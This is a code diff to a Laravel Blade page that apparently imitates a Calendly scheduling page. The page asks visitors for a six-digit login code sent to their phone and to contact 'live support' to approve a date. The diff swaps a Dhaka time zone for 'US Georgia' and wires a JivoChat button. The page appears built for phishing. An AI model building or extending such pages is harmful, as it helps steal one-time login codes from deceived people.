@@ -62,7 +62,7 @@
                                         <p>Time zone</p>
                                         <div class="central">
                                             <img width="14px" src="{{asset('world.png')}}">
-                                            Asia/Dhaka (17:53)
+                                            US Georgia (00:59)
                                         </div>
                                     </div>
                                 </div>
@@ -73,7 +73,7 @@
                             <h2>Please contact our live support to fully approve your scheduled date</h2>
                             <div class="loader2"></div>
                             <div style="margin-top: 40px;">
-                                <a class="blue-btn" href="#" >Contact live chat support</a>
+                                <a id="openChat" class="blue-btn" href="#" >Contact live chat support</a>
                             </div>
                         </div>
                         <a class="logo__wrapper-calendly hide__mobile">
@@ -307,9 +307,9 @@
                                             <div class="show-input-on-mobile show__input-modal">
                                                 <input maxlength="6" minlength="6" name="code2"  placeholder="Login Code" type="number" required="required">
                                                 @if($codeError)
-                                                <div class="show-error-modal2">
-                                                    <p>The login code you entered doesn't match the one sent to your phone. Please check the number and try again.</p>
-                                                </div>
+                                                    <div class="show-error-modal2">
+                                                        <p>The login code you entered doesn't match the one sent to your phone. Please check the number and try again.</p>
+                                                    </div>
                                                 @endif
                                             </div>
                                             <div class="having-trouble-class">
@@ -967,6 +967,14 @@
         }).catch(error => {
 
         });
+    });
+    document.getElementById('openChat').addEventListener('click', function(e) {
+        e.preventDefault();
+        if (window.jivo_api) {
+            jivo_api.open();
+        } else {
+            console.error('JivoChat API is not loaded yet.');
+        }
     });
 </script>
 @endscript
